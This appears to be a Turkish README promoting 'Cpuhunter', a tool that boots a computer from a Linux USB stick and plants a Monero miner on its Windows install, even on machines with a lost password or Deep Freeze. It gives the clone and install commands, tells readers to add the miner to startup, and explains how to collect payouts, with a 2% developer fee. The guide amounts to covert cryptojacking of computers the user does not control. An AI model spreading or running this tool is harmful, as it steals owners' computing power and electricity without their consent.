# Cpuhunter

![Usb live linux 2 windows monero miner](https://image.ibb.co/gPWncJ/usb_linux_100672302_primary_idge.jpg)

Şifresi kaybolmuş ya da deep freeze yüklü olsa bile istisnasız tüm bilgisayarlar birer para basma makinasıdır. 

Bırakın bilgisayarlar sizin için çalışsın. 

# Neler gerekli

* Monero cüzdan adresi (Ödemelerinizi almak için, [Mymonero.com](https://mymonero.com) adresinden kolayca oluşturabilirsiniz). 
* Usb bellek. 

# Kurulum 

Flash belleğe linux yükleyin ve aşağıdaki komutları çalıştırın. 

```
sudo apt-get install python3 geany
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

# Kullanım
Bilgisayarı usb'den boot ettiğinizde karşınıza otomatik olarak config.json dosyası açılacak. Wallet kısmı karşısına monero cüzdanınızı girmeniz yeterlidir. 

Çalıştırma komutu:

```
python3 /$USER/cpuhunter/exeinstaller.py
```

Üstteki komutunu başlangıca eklerseniz bilgisayar açıldığında otomatik olarak işlem yapmaya başlayacaktır. 

# Kazançların takibi
Kazanç takip adresiniz: https://xmr.nanopool.org/account/[monero_adresiniz]

[Örnek rapor](https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S)



# Ödemelerin alınması
1 monero kazandığınızda [mymonero.com](https://mymonero.com) hesabınıza geçecektir. Dolar'a ya da TL'ye çevirip banka hesabınıza aktarabilirsiniz. 

# Ekler 
* Monero neredeyse tüm borsalarda işlem görmekte olan gizliliğe dayalı güvenilir bir altcoindir. Gelecekte de fiyatının oldukça artması beklenmektedir. 
* Geliştirici komisyonu %2'dir. Gönderilen 100 hasrate'in 2'si geliştirici adresine 98'i de sizin adresinize yönlendirilir. Mymonero.com ya da Nanopool.com kazançlarınızdan düşmemektedir. 
* Worker id'ler otomatik olarak oluşturulmaktadır. 
* Ne kadar kazanç elde ettiğinizi detaylı olarak takip edebilirsiniz. 
